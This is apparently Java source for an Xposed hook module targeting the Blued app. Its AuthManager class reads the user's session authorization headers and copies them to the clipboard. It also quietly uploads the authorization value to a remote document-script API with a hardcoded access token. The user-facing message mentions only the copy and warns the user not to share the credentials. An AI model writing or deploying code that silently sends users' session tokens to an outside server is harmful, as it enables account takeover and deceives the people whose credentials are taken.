package com.zjfgh.bluedhook.simple;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

import androidx.annotation.NonNull;

import com.alibaba.fastjson2.JSONObject;

import java.io.IOException;
import java.util.Collections;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import de.robv.android.xposed.XposedHelpers;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class AuthManager {
    private static final String AIR_SCRIPT_TOKEN = "5e56J7bsc45egjJUlfFM6C";
    private static final Pattern AUTH_PATTERN =
            Pattern.compile("authorization:\\s*(.*)", Pattern.CASE_INSENSITIVE);

    public static Map<String, String> auHook(boolean isClipboard, ClassLoader classLoader, Context context) {
        try {
            Map<String, String> authHeaders = fetchAuthHeaders(classLoader);
            String formattedHeaders = formatHeaders(authHeaders);

            if (isClipboard) {
                handleClipboardAndServerUpload(context, formattedHeaders, authHeaders);
            }

            return authHeaders;
        } catch (Exception e) {
            showToast("操作失败: " + e.getMessage());
            return Collections.emptyMap();
        }
    }

    @SuppressWarnings("unchecked")
    public static Map<String, String> fetchAuthHeaders(ClassLoader classLoader) {
        Class<?> bluedHttpTools = XposedHelpers.findClass(
                "com.blued.android.framework.http.BluedHttpTools", classLoader);
        return (Map<String, String>) XposedHelpers.callStaticMethod(bluedHttpTools, "a", true);
    }

    private static String formatHeaders(Map<String, String> headers) {
        StringBuilder text = new StringBuilder();
        for (Map.Entry<String, String> entry : headers.entrySet()) {
            text.append(entry.getKey().toLowerCase())
                    .append(": ")
                    .append(entry.getValue())
                    .append("\n");
        }
        return text.toString();
    }

    private static void handleClipboardAndServerUpload(Context context, String formattedHeaders,
                                                       Map<String, String> authHeaders) {
        if (authHeaders.isEmpty()) {
            showToast("验证信息复制失败，请联系开发者。（非Blued官方）");
            return;
        }

        copyToClipboard(context, formattedHeaders);
        String authorizationValue = extractAuthorization(formattedHeaders);

        if (authorizationValue != null) {
            uploadAuthToServer(authorizationValue);
            showToast("验证信息已复制！请不要将验证信息随意给别人！");
        }
    }

    private static void copyToClipboard(Context context, String text) {
        ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("auth_headers", text);
        clipboard.setPrimaryClip(clip);
    }

    private static String extractAuthorization(String headersText) {
        Matcher matcher = AUTH_PATTERN.matcher(headersText);
        return matcher.find() ? matcher.group(1) : null;
    }

    private static void uploadAuthToServer(String authorizationValue) {
        OkHttpClient client = new OkHttpClient();
        RequestBody body = createRequestBody(authorizationValue);

        Request request = new Request.Builder()
                .url(NetworkManager.getJinShanDocBluedAuthApi())
                .post(body)
                .addHeader("AirScript-Token", AIR_SCRIPT_TOKEN)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) {
                try (ResponseBody responseBody = response.body()) {
                    if (responseBody != null) {
                        showToast(response.code() + " " + response.message());
                    }
                }
            }

            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                showToast("上传失败: " + e.getMessage());
            }
        });
    }

    private static RequestBody createRequestBody(String authorizationValue) {
        // 使用 Fastjson 的 JSONObject 构建 JSON
        JSONObject jsonObj = new JSONObject();
        JSONObject context = new JSONObject();
        JSONObject argv = new JSONObject();
        JSONObject info = new JSONObject();
        // 设置 info 字段
        info.put("app_name", "BluedAuth");
        info.put("type", "授权");
        info.put("lid", "111");
        info.put("au", authorizationValue);
        // 设置 argv 字段
        argv.put("type", "setBluedAu");
        argv.put("data", info);
        // 构建完整 JSON
        jsonObj.put("context", context);
        context.put("argv", argv);
        // 转换为 JSON 字符串并创建 RequestBody
        String jsonStr = jsonObj.toJSONString();
        return RequestBody.create(jsonStr, MediaType.get("application/json"));
    }

    private static void showToast(String message) {
        ModuleTools.showBluedToast(message, AppContainer.getInstance().getClassLoader());
    }
}